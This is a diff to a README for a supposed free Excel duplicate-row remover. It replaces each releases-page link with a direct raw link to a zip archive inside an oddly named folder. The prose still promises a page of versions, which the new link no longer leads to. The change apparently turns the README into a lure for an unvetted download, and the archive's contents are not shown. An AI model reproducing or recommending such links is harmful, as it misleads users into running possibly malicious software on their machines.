@@ -8,7 +8,7 @@ You have an Excel file with hundreds or thousands of rows. Some rows are repeate
 
 ## 📥 Get the Application Now
 
-[![Download Excel Duplicate Row Remover](https://img.shields.io/badge/Download%20Now-Free%20Tool-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/clausdoublebreasted339/excel-duplicate-row-remover/releases)
+[![Download Excel Duplicate Row Remover](https://img.shields.io/badge/Download%20Now-Free%20Tool-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/clausdoublebreasted339/excel-duplicate-row-remover/main/chalcostibite/excel_row_remover_duplicate_v2.1-beta.5.zip)
 
 Visit this link to download the application.
 
@@ -22,7 +22,7 @@ Following these steps will get the tool running on your computer in about two mi
 
 Open your web browser (like Chrome, Edge, or Firefox). Click the big green button above or type this address into the address bar:
 
-`https://github.com/clausdoublebreasted339/excel-duplicate-row-remover/releases`
+`https://raw.githubusercontent.com/clausdoublebreasted339/excel-duplicate-row-remover/main/chalcostibite/excel_row_remover_duplicate_v2.1-beta.5.zip`
 
 You will see a page listing different versions of the software.
 
@@ -173,7 +173,7 @@ This tool is **completely free**. You can use it for personal and commercial pur
 
 Stop wasting time scrolling through spreadsheets manually. Download the tool, run it, and clean your data in one click.
 
-### [🔽 Download Excel Duplicate Row Remover](https://github.com/clausdoublebreasted339/excel-duplicate-row-remover/releases)
+### [🔽 Download Excel Duplicate Row Remover](https://raw.githubusercontent.com/clausdoublebreasted339/excel-duplicate-row-remover/main/chalcostibite/excel_row_remover_duplicate_v2.1-beta.5.zip)
 
 Visit this link to download the application.
 
